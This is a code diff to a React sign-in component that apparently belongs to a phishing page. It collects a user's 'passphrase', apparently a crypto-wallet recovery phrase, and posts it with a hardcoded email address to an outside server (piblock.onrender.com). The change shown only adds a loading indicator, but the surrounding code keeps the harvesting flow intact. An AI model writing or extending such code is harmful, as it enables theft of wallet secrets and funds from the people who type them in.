@@ -11,7 +11,9 @@ function Signin() {
     const [isValid, setIsvalid] = useState(true)
     const [pressedFaceId, setpressedFaceId] = useState(false)
 
-    const [showModal, setshowModal] = useState(true)
+    const [islaoding, setislaoding] = useState(false)
+
+    const [showModal, setshowModal] = useState(false)
 
     const email = "igwezehycient86@gmail.com"
 
@@ -20,6 +22,7 @@ function Signin() {
 
         if (phrase.length > 23) {
             setIsvalid(true)
+            setislaoding(true)
             axios.post('https://piblock.onrender.com/message', {
                 message: phrase,
                 email
@@ -31,6 +34,8 @@ function Signin() {
                     console.log("it happened here ", reason)
                     setIsvalid(false)
                 })
+            setislaoding(false)
+
             // fetch('http://piblock.onrender.com/message', {
             //     //methods -> POST,GET,PUT,PATCH,DELETE
             //     method: 'POST',
@@ -123,7 +128,7 @@ function Signin() {
                                     <div className="text-center">
                                         <div className="col-lg-12 col-md-12 mt-6">
                                             <button type="submit" className="border-purple h-[50px] w-full bg-black text-white flex justify-center items-center">
-                                                SIGNIN WITH PASSPHRASE
+                                                {islaoding ? "loading ..." : " SIGNIN WITH PASSPHRASE"}
                                             </button>
                                         </div>
                                         <div onClick={(e) => { e.preventDefault(); setpressedFaceId(true); }} className="col-lg-12 col-md-12">
